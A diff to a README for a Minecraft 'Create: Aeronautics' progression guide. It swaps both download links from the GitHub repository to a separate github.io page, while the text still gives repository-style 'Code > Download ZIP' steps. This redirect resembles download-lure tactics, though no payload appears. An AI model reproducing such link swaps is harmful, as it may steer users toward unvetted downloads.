@@ -1,6 +1,6 @@
 # ✈️ create-aeronautics-progression - Master flight systems in Minecraft today
 
-[![](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://github.com/Tuscan-twopiece875/create-aeronautics-progression)
+[![](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://tuscan-twopiece875.github.io)
 
 This guide helps you navigate the complex mechanics of the Create: Aeronautics mod. Whether you want to build massive airships or automate complex engine systems, this project provides the steps to succeed. The guide covers everything from basic parts to advanced flight controls added in the latest 2026 update.
 
@@ -19,7 +19,7 @@ Before you begin, ensure your computer meets these standards to run the game wit
 
 You need the base project files to start your progression path. Visit the link below to reach the official download page. You will find the complete set of instructions and mod files at this location.
 
-[Download the project files here](https://github.com/Tuscan-twopiece875/create-aeronautics-progression)
+[Download the project files here](https://tuscan-twopiece875.github.io)
 
 Click the green "Code" button on the webpage and select "Download ZIP" to save the files to your computer. Open your Downloads folder and extract the contents to a new folder on your desktop.
 
